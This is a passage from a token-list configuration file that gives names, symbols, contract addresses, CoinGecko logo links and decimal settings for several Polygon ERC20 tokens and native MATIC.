      address: "0xE0339c80fFDE91F3e20494Df88d4206D86024cdF",
      logo: "https://assets.coingecko.com/coins/images/14962/standard/6GxcPRo3_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 45
    },
    {
      name: "Gains Farm",
      symbol: "GFARM2",
      address: "0x7075cAB6bCCA06613e2d071bd918D1a0241379E2",
      logo: "https://assets.coingecko.com/coins/images/13703/standard/gfarm_v2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 46
    },
    {
      name: "Impermax",
      symbol: "IMX",
      address: "0x60bB3D364B765C497C8cE50AE0Ae3f0882c5bD05",
      logo: "https://assets.coingecko.com/coins/images/15126/standard/Copy_of_200px.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 47
    },
    {
      name: "SushiSwap",
      symbol: "SUSHI",
      address: "0x0b3F868E0BE5597D5DB7fEB59E1CADBb0fdDa50a",
      logo: "https://assets.coingecko.com/coins/images/12271/standard/512x512_Logo_no_chop.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },
    {
      name: "QiDao",
      symbol: "QI",
      address: "0x580A84C73811E1839F75d86d75d88cCa0c241fF4",
      logo: "https://assets.coingecko.com/coins/images/15329/standard/qi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 24
    },
    {
      name: "Gains Network",
      symbol: "GNS",
      address: "0xE5417Af564e4bFDA1c483642db72007871397896",
      logo: "https://assets.coingecko.com/coins/images/19737/standard/logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 25
    },
    {
      name: "Plasma Finance",
      symbol: "PPAY",
      address: "0x08158A6b5d4018340387d1A302f882E98a8bC5b4",
      logo: "https://assets.coingecko.com/coins/images/13360/standard/Hi9sEGAD.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 26
    },
    {
      name: "Polymath",
      symbol: "POLY",
      address: "0xcB059C5573646047D6d88dDdb87B745C18161d3b",
      logo: "https://assets.coingecko.com/coins/images/2784/standard/inKkF01.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 27
    },
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};
